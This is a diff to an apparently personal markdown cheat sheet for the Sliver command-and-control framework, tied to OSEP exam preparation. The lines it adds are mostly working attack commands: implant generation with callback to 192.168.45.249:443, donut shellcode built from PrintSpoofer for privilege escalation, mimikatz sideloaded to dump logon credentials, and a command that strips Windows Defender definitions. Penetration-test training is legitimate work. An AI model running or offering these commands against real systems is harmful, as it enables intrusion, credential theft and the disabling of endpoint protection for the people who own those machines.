@@ -1,5 +1,6 @@
 # Install Guide:
 
+- https://bishopfox.com/blog/passing-the-osep-exam-using-sliver
 
 - Run the following command, sliver install complete
 ```bash
@@ -57,4 +58,19 @@ generate -e -f shared -m 192.168.45.249:443 -R
 generate  -e -f exe -m 192.168.45.249:443 
 
 # For beacons add `beacon` at the beginning and `-S` for timeout and `-J` for jitter
+
+# Generate shellcode to execute in sliver process, be sure to upload a session to execute it.
+donut /var/www/html/bin/PrintSpoofer64.exe -a 2 -b 2 -o /tmp/payload.bin -p '-c c:\windows\tasks\sph.exe'
+```
+
+# Executing Commands
+
+# Sideloading tools
+```
+sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
+```
+
+# Nuke defender
+```
+execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
